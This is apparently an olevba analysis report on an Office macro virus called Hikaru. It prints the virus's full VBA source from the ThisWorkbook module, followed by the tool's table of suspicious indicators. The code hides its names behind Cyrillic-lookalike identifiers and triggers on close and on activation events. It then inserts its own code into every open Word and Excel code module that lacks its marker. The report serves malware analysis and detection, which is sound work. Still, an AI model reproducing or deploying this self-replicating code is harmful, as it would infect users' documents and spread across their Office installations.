olevba 0.60.1.dev6 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSOffice.Hikaru-637641768611e636f1f899282b119527968e36bf
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO Sheet1.cls 
in file: Virus.MSOffice.Hikaru-637641768611e636f1f899282b119527968e36bf - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet2.cls 
in file: Virus.MSOffice.Hikaru-637641768611e636f1f899282b119527968e36bf - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet3.cls 
in file: Virus.MSOffice.Hikaru-637641768611e636f1f899282b119527968e36bf - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet3'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO ThisWorkbook.cls 
in file: Virus.MSOffice.Hikaru-637641768611e636f1f899282b119527968e36bf - OLE stream: '_VBA_PROJECT_CUR/VBA/ThisWorkbook'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

'Copyright (C) 1998 by FlyShadow ~^^~ - Hikaru
Dim Јf As String, Јh As Byte
Private Sub Document_Close()
 On Error Resume Next
 Јl Application.VBE: Јh = 1
 Јl GetObject(, "Word.Application").VBE
 Јl GetObject(, "Excel.Application").VBE
End Sub
Private Sub Јl(ByRef Јj As Object)
 For Јd = 1 To Јj.CodePanes.Count
 Set Јo = Јj.CodePanes(Јd).CodeModule
    If Јo.Find("~^^~", 0, 0, 0, 0) And Јh = 0 Then
        Јf = Јo.Lines(1, Јo.CountOfLines): Јh = 1: Јd = 0
    End If
    If Not Јo.Find("~^^~", 0, 0, 0, 0) And Јh = 1 Then
        Јj.CodePanes(Јd).CodeModule.InsertLines 1, Јf
    End If
 Next
End Sub
Private Sub Workbook_Deactivate(): Document_Close: End Sub
Private Sub UserForm_Initialize(): Document_Close: End Sub
Private Sub Worksheet_Activate(): Document_Close: End Sub
-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|GetObject           |May get an OLE object with a running instance|
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |Application.VBE     |Executable file name                         |
+----------+--------------------+---------------------------------------------+

